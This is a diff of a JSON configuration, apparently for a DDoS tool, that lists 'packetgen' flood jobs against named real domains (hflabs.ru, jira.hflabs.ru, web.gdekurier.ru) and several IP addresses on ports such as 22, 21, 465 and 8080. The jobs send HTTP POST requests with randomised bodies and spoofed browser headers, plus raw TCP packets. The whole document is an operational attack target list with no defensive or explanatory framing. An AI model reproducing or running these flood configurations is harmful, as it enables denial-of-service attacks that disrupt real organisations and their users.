@@ -9,6 +9,72 @@
         {
             "type": "packetgen",
             "count": 26,
+            "name": "https://hflabs.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "hflabs.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://hflabs.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://hflabs.ru",
+                                "Referer": "https://hflabs.ru",
+                                "X-Forwarded-Host": "hflabs.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 26,
+            "name": "tcp://83.220.54.202:8180",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "83.220.54.202:8180"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 26,
             "name": "tcp://83.220.54.202:993",
             "args": {
                 "connection": {
@@ -31,157 +97,6 @@
         {
             "type": "packetgen",
             "count": 26,
-            "name": "http://web.gdekurier.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "web.gdekurier.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://web.gdekurier.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://web.gdekurier.ru",
-                                "Referer": "http://web.gdekurier.ru",
-                                "X-Forwarded-Host": "web.gdekurier.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 26,
-            "name": "tcp://193.106.94.145:8080",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "193.106.94.145:8080"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 26,
-            "name": "https://jira.hflabs.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "jira.hflabs.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://jira.hflabs.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://jira.hflabs.ru",
-                                "Referer": "https://jira.hflabs.ru",
-                                "X-Forwarded-Host": "jira.hflabs.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 26,
-            "name": "tcp://95.181.230.7:9010",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "95.181.230.7:9010"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 26,
-            "name": "tcp://83.220.54.202:8080",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "83.220.54.202:8080"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 26,
             "name": "tcp://83.220.54.202:8088",
             "args": {
                 "connection": {
@@ -189,6 +104,72 @@
                     "args": {
                         "protocol": "tcp",
                         "address": "83.220.54.202:8088"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 26,
+            "name": "tcp://83.220.54.202:465",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "83.220.54.202:465"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 26,
+            "name": "tcp://95.181.230.7:9011",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.181.230.7:9011"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 26,
+            "name": "tcp://83.220.54.202:21",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "83.220.54.202:21"
                     }
                 },
                 "packet": {
@@ -248,57 +229,13 @@
         {
             "type": "packetgen",
             "count": 26,
-            "name": "https://hflabs.ru",
+            "name": "tcp://83.220.54.202:9050",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "hflabs.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://hflabs.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://hflabs.ru",
-                                "Referer": "https://hflabs.ru",
-                                "X-Forwarded-Host": "hflabs.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 26,
-            "name": "tcp://83.220.54.202:2000",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "83.220.54.202:2000"
+                        "address": "83.220.54.202:9050"
                     }
                 },
                 "packet": {
@@ -314,38 +251,13 @@
         {
             "type": "packetgen",
             "count": 26,
-            "name": "tcp://83.220.54.202:465",
+            "name": "http://web.gdekurier.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "83.220.54.202:465"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 26,
-            "name": "https://web.gdekurier.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "web.gdekurier.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "web.gdekurier.ru:80"
                     }
                 },
                 "packet": {
@@ -353,7 +265,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://web.gdekurier.ru",
+                            "path": "http://web.gdekurier.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -366,8 +278,8 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://web.gdekurier.ru",
-                                "Referer": "https://web.gdekurier.ru",
+                                "Origin": "http://web.gdekurier.ru",
+                                "Referer": "http://web.gdekurier.ru",
                                 "X-Forwarded-Host": "web.gdekurier.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
@@ -380,13 +292,13 @@
         {
             "type": "packetgen",
             "count": 26,
-            "name": "tcp://83.220.54.202:8180",
+            "name": "tcp://95.181.230.7:9010",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "83.220.54.202:8180"
+                        "address": "95.181.230.7:9010"
                     }
                 },
                 "packet": {
@@ -402,13 +314,13 @@
         {
             "type": "packetgen",
             "count": 26,
-            "name": "tcp://95.181.230.7:9011",
+            "name": "tcp://83.220.54.202:8080",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "95.181.230.7:9011"
+                        "address": "83.220.54.202:8080"
                     }
                 },
                 "packet": {
@@ -424,76 +336,13 @@
         {
             "type": "packetgen",
             "count": 26,
-            "name": "http://hflabs.ru",
+            "name": "tcp://193.106.94.145:8080",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "hflabs.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://hflabs.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://hflabs.ru",
-                                "Referer": "http://hflabs.ru",
-                                "X-Forwarded-Host": "hflabs.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 26,
-            "name": "tcp://83.220.54.202:8291",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "83.220.54.202:8291"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 26,
-            "name": "tcp://94.79.54.160:22",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "94.79.54.160:22"
+                        "address": "193.106.94.145:8080"
                     }
                 },
                 "packet": {
@@ -550,13 +399,142 @@
         {
             "type": "packetgen",
             "count": 26,
-            "name": "tcp://83.220.54.202:21",
+            "name": "http://hflabs.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "83.220.54.202:21"
+                        "address": "hflabs.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://hflabs.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://hflabs.ru",
+                                "Referer": "http://hflabs.ru",
+                                "X-Forwarded-Host": "hflabs.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 26,
+            "name": "https://jira.hflabs.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "jira.hflabs.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://jira.hflabs.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://jira.hflabs.ru",
+                                "Referer": "https://jira.hflabs.ru",
+                                "X-Forwarded-Host": "jira.hflabs.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 26,
+            "name": "https://web.gdekurier.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web.gdekurier.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://web.gdekurier.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://web.gdekurier.ru",
+                                "Referer": "https://web.gdekurier.ru",
+                                "X-Forwarded-Host": "web.gdekurier.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 26,
+            "name": "tcp://83.220.54.202:8291",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "83.220.54.202:8291"
                     }
                 },
                 "packet": {
@@ -572,13 +550,35 @@
         {
             "type": "packetgen",
             "count": 26,
-            "name": "tcp://83.220.54.202:9050",
+            "name": "tcp://83.220.54.202:2000",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "83.220.54.202:9050"
+                        "address": "83.220.54.202:2000"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 26,
+            "name": "tcp://94.79.54.160:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "94.79.54.160:22"
                     }
                 },
                 "packet": {
